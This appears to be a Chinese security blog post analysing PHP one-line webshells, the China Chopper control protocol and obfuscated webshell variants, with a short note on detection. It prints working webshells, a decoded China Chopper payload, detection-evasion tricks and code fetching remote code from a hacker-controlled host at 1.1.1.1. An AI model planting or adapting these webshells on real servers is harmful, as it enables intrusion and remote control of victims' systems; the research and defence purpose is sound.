---
layout: post
title: "php一句话webshell研究"
author: alpha1e0
categories: 渗透测试
tags: 渗透测试
---

# 1 前言

在无法直接登陆目标系统的情况下，如果需要远程控制一台主机则必须满足以下两个条件：

1. **可以向目标主机传送一段代码**（往往被称为恶意代码、shell、后门、木马等）
2. **可以触发这段代码执行**

在系统安全领域里经常通过*远程缓冲区溢出*或*传送可执行文件欺骗点击*实现。

1. 前者可执行代码在shellcode中，例如通过网络报文直接注入到目标主机内存中，通过shellcode覆盖操作系统关键数据结构从而触发shellcode中的代码执行
2. 后者通过各种通道例如邮件，将文件传送到目标主机，被动等待管理员点击触发执行，由于需要管理员点击，此类攻击往往需要一定的“运气”。

很显然，这些攻击方式攻击成本较高，shellcode编写往往和目标系统环境版本强相关，并且随着DEP和ASLR等技术的广泛使用，shellcode编写往往越来越困难


而在WEB安全领域此类攻击**成本很低**。

例如WEB安全中最严重的漏洞--*上传漏洞* 

和*传送可执行文件欺骗点击*相比不同的是，这里不需要运气了，攻击者可以通过URL访问主动触发代码执行，可见上面的两个条件这里非常容易实现。

1. 通过WEB页面上传一个webshell（用高级语言编写的web后门）
2. 直接通过URL访问上传的webshell从而触发webshell执行

和系统安全领域相比，这种攻击成本要明显小很多，webshell一般是高级语言编写比汇编语言的shellcode简单很多，并且高级语言执行环境屏蔽了系统底层的差异，webshell往往是天然跨平台兼容的（实际上也和容器环境有关）；并且触发webshell非常容易，只要知道webshell的位置，访问url即可

因此上传漏洞长期以来是web安全的重灾区，在这种攻击手段的早期，往往编写一个比较复杂的webshell上传到服务器，称之为**大马**，其中包括文件上传下载、目录访问、命令执行、数据库连接这些功能，通过url打开后像操作正常网页一样控制目标主机。但这种方式存在一些缺点：

* webshell实现功能较多因此文件较大，容易被发现
* 由于文件大，也容易被安全软件特征匹配
* 编写较为复杂


为了解决这些问题后来发展出来了一句话webshell，称之为**“一句话木马、小马”**，当然这里的“一句话”并非总是一句代码，而只是形容webshell非常简短。一句话webshell原理很简单，利用了eval这样的函数，通过post将恶意代码发给webshell的eval函数来执行。

由于需要经常发送恶意攻击代码给webshell的eval函数执行，因此为了方便操作往往实现一个复杂的客户端用于生成和发送各种攻击代码，这其中最广为人知的客户端是“china copper”即“中国菜刀”。

至此一句话webshell + “中国菜刀”成为国内黑客必备的利器组合。本文主要研究此种攻击方式及相应的防御方法。限于篇幅所限，本文主要聚焦于PHP环境。

---

# 2 经典一句话攻击方法

## 2.1 经典的PHP一句话webshell

PHP是最常见的WEB服务端语言之一，PHP是解释型高级语言，编写简单。全球有80%以上的站点采用PHP作为web服务端语言，这些站点主要集中在中、小规模的站点，但也有少数大规模web应用使用，例如Facebook。

PHP服务器一直是一句话webshell攻击的重灾区，**经典的PHP一句话webshell如下**：

	<?php @eval($_POST['pass']);?>

> 这句代码从POST中取出pass参数，调用eval函数执行pass参数的内容。
> 由于成功执行命令需要知道参数名称，因此参数名称充当了“密码”的功能，经常被称为密码，例如这里的密码是“pass”

有了webshell就可以访问webshell远程代码执行了，例如执行phpinfo()，可以构造payload，

	pass=echo phpinfo();

url编码后发送到目标主机即可执行，结果如下图所示：

![一句话执行phpinfo()](ziliao\1.jpg "一句话执行phpinfo()")

需要注意的是，一句话webshell可以插入到很多正常的php文件中来隐藏自己

## 2.2 webshell管理工具

中国菜刀 weevely quasibot altman

中国菜刀工具是国内最长见的webshell管理工具，GUI界面操作简单方便。此类工具并非就一句话webshell攻击方式必须的，手动构造payload也可以实现操控，但太繁琐。

除了“中国菜刀”外，Metasploit、weevely等工具也可完成webshell的管理。

中国菜刀的界面如下：

![中国菜刀](ziliao\2.jpg "中国菜刀")

这里以“查看目录”功能为例分析中国菜刀的工作原理

在这里点击“D:/www/iis”目录，捕获报文，得到如下报文数据（http post数据）：

	pass=$xx%3Dchr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/.($xx/**/.($yy[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKGdldF9tYWdpY19xdW90ZXNfZ3BjKCk%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuIi8iLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiIKIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fTtlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=RDpcXHd3d1xcaWlzXFw%3D

以上的payload有三个参数：

1. pass参数。pass参数和一句话webshell中*$_POST['pass']*对应，一句话木马会执行pass中的语句
2. z0参数。z0参数是真正包含payload的位置，使用base64编码
3. z1参数。z1参数在这里是在中国菜刀中点击选中的目录

**1、pass参数**

pass参数在eval中执行，eval会执行chr函数完成解码，解码后的内容为：

	$xx=base64_decode;$yy=$_POST;@eval/**/.($xx/**/.($yy[z0]))

语义等价于：

	@eval(base64_decode($_POST([$z0)))

可以看到这是一个嵌套的“一句话webshell”

**2、z0参数**

z0参数为base64编码，解码后格式化得到的内容为：

{% highlight php %}
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
$D=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"]); //z1参数为中国菜刀中点击查看的目录
$F=@opendir($D);  //打开目录
if($F==NULL){
	echo("ERROR:// Path Not Found Or No Permission!");
}else{
	$M=NULL;
	$L=NULL;
	while($N=@readdir($F)){  //读取目录
		$P=$D."/".$N;
		$T=@date("Y-m-d H:i:s",@filemtime($P));  //获取文件创建时间
		@$E=substr(base_convert(@fileperms($P),10,8),-4);  //获取文件访问权限
		$R="\t".$T."\t".@filesize($P)."\t".$E."";  //获取文件大小
		if(@is_dir($P))$M.=$N."/".$R;
		else $L.=$N.$R;
	}
	echo $M.$L;
	@closedir($F);
};
echo("|<-");die();
?>
{% endhighlight %}

**3、z1参数**

在这里z1参数为：

	D:\\www\\iis\\

经过多个报文分析，中国菜刀控制通道的报文结构是一样的，pass参数的内容一样，不同的是z0参数，有的还有z1等参数

中国菜刀的控制通道数据特征明显，比较容易使用中间网络设备检测到

## 2.3 经典一句话webshell攻击防御

在经典一句话webshell攻击方式中，攻击过程可分为两步：

1. webshell上传。通过上传漏洞上传webshell到可访问的web目录。
2. 控制通道发送攻击payload。通过中国菜刀等工具发送实际的攻击payload。

因此对此的防御也可着手于这两个步骤，切断其中一个即可完成防御

根据安全软件的位置可以简单分为

1. 主机安全软件。主机安全软件一般侧重于检测文件系统，发现已经被上传的webshell，不检测到菜刀和webshell之间的控制通道通信。例如360、安全狗、D盾等
2. 网络安全设备。网络安全设备可以检测到webshell（检测webshell上传时的报文），同时可以检测到菜刀和webshell之间的通信。

对于经典webshell的检测简单一些可以通过关键字的匹配，但是一句话webshell容易编写，有很多变种，检测起来很困难，下面章节会具体讨论

对于控制通道的检测，中国菜刀的控制通道特征明显非常容易检测，由于客户端的编写复杂，控制通道反而更加容易检测一些。

---

# 3 一句话webshell的变种

检测webshell的技术设计有*关键字匹配*、*正则表达式*、*语法/语义分析*，前两种技术实现简单，在实际工程中被大量使用，是非常成熟的技术；第三种技术最先进最理想，但实现困难。现实中大部分防御技术都采用前两者。因此常见的变种技术都针对前两者。

绕过技术有3种思路：

1. 变换语法结构。在保证语义不变的情况下变化语法，现有的编程语言已经非常灵活了，对于同一个语义，例如webshell的“执行一个含有命令的字符串”往往有很多种语法可以实现。这是主要的绕过思路，当然对于*语法/语义分析*方式的安全软件这种方式往往会失效。
2. 编解码。编解码主要是为了绕过网络安全设备，网络中的报文往往是多重编码的，网络安全设备必须更够正确解码才能获得原始的数据，才能检测出攻击，进行一些应用程序可以解码的不常见编码往往可能绕过安全设备。对于主机安全软件，这一点失效，因为主机安全软件检测的对象往往是已经经过应用程序正确解码了。
3. 利用安全软件实现的问题。安全软件往往也存在一些软件bug，利用这些针对性的bug往往也可绕过。

在本文中我们仅介绍“变换语法结构”的绕过思路

据不完全统计PHP中“执行一个含有命令的字符串”的函数有如下几个：

	eval, preg_replace, assert, array_map, call_user_func, create_function, call_user_func_array, preg_replace_callback

不同版本对上面几个函数的支持不同，例如PHP5.5之后取消了preg\_replace使用preg\_replace_callback代替


## 3.1 字符串执行函数

如2.1章所述，一句话webshell从语义上很简单“从HTTP请求中获取一个包含php代码的字符串”，执行这个字符串

因此一句话webshell必须实现“执行字符串”的功能，在php中有以下函数能够实现这些功能。

**eval**

> mixed eval(string $code)

eval是最普遍使用的函数，能够执行一个php代码组成的字符串，例如

	eval('phpinfo();'); //会执行phpinfo函数
	
	webshell: eval($_POST['p']);

注意，eval实际上并不是一个函数，而是一个语言构造器，因此不能使用可变函数

**assert**

> bool assert(mixed $assertion [, string $description ])

assert检查一个断言assertion是否为false，例如

	assert("phpinfo();");

	webshell: assert($_POST['p']);

**preg\_replace**

> mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit=-1 [,int &$count]])

preg_replace用正则表达式替换字符串，在php5.5之前当使用/e修饰符时，可以执行$replacement参数，例如

	preg_replace("/aaa/e","phpinfo()",$subject); //执行phpinfo()

	webshell: preg_replace("/aaa/e",$_POST['p'],$subject);

**create_function**

> string create_function(string $args, string $code)

create_function函数能够根据一个字符串创建函数，结合call\_user\_func能够实现和eval一样的功能，例如

	call_user_func(create_function(null,"phpinfo();"))

	webshell: call_user_func(create_function(null,$_POST['p']))

注意，create_function创建的函数需要通过*call\_user\_func/call\_user\_func\_array\array\_map*这些函数调用


## 3.2 可变函数

PHP支持可变函数的概念，如果一个变量后面有圆括号，则PHP将括号前面的变量当作一个函数来执行，例如

	$var="assert";
	$var("phpinfo();");

PHP会将$var变量当作"assert"函数来执行

可变函数提供了一种非常灵活的特性，但在安全领域越灵活意味着越难防御，可变函数使得基于特征的检测很难有好的效果

仍然以上面的例子，本来assert可以作为特征检测中一个重要的指标，但由于可变函数的存在，这个特征不存在了

	$a="ss";
	$var="a".$a."ert"
	$var("phpinfo();");

只要加上一定的字符串操作就可以隐藏特征，在实际的操作中非常灵活，可以使用任意字符串操作的函数进行字符串变化，当然也可以使用各种编解码的函数

## 3.3 其他技巧

**利用变量传递函数**

结合可变函数特性，可以通过参数传递函数，这样避免了webshell中有过多特征，例如一句话webshell为：

	$_GET['f']($_POST['P']);
	连接URL为：shell.php?f=assert

通过参数将函数名传递给服务器

**利用allow\_url\_fopen特性**

默认情况下PHP的allow\_url\_fopen是开启的，因此可以通过url从网络上一个位置读取文件，利用这个特性webshell完全没有必要放到目标服务器上，可以将webshell放到黑客控制的服务器上，目标服务器放一段代码读取并执行远端的webshell

	目标服务器上的代码：
	$url='http://1.1.1.1/a';
	assert(file_get_contents($url));

	黑客控制的服务器1.1.1.1存放真正的webshell，放在文件a中，内容为
	@eval($_POST['p']);

**利用allow\_url\_include特性**

在allow\_url\_include开启的情况下（默认不开启），可以直接include互联网上一个远端文件，例如

	目标服务器上的代码：
	include($_GET['l']);

	黑客控制的服务器1.1.1.1存放真正的webshell，放在文件a中，内容为
	<?php @eval($_POST['p']);?>

	连接URL为：shell.php?l=http://1.1.1.1/a


## 3.4 一些变种webshell分析

**webshell示例 1**

变种的一句话webshell基本上都是按照3.1、3.2、3.3节中提到的技术，选择一个字符串执行函数、利用可变函数对函数名进行字符串变换、加上其他一些技巧。本节中将分析一些"畸形"的webshell

	<?
	$__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09";
	$__P_P="abcdefghijklmnopqrstuvwxyz";
	$__X_X="123456789";
	$__O_O=$__X_X[5].$__X_X[3]."_";  //$__O_O="64_"
	$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];  //$__B_B="base"
	$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4]; //$__H_H="base64_decode"
	$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11]; //$__E_E="eval"
	$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];  //$__F_F="create"
	$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13]; //$__F_F="create_function"
	$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");'); //$_[00]=create_function('$__S_S',eval($__S_S))=eval()
	@$_[00]($__H_H($__H_H($__C_C))); //eval(base64_decode(base64_decode(WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09)))=eval(eval($_POST[x]);) 
	?>

这个一句话木马中使用了3.1和3.2节中的技术，通过字符串操作生成了函数"create\_function"、"base64\_decode"，"base64\_decode"解密了$\_\_C\_C得到"eval($\_POST[x]);"，"create\_function"则创建了一个eval函数

**webshell示例2**

	<?php @$_="s"."s"./*- 
	//////////////////// 
	*-*/"e"./*-/*-*/"r";
	@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";  //$_="assert"
	@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/
	/////////////////////
	*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>

	去掉注释得到：
	<?php @$_="s"."s"."e"."r";		//$_="sser"
	@$_="a".$_."t";			//$_="assert"
	@$_(${"_P"."OS"."T"}[0-2-5]);?>		//assert(${_POST}[-7])

这个木马使用了可变函数特性对assert进行了字符串变换，并且在其中加入了很多注释符号作为混淆

**webshell示例3**

	<?php $url='http://localhost/DebugPHP/getcode.php?call=code';
	call_user_func(create_function(null,pack('H*',file_get_contents($url))));?>

这个木马从远端读取文件，然后执行文件中的内容

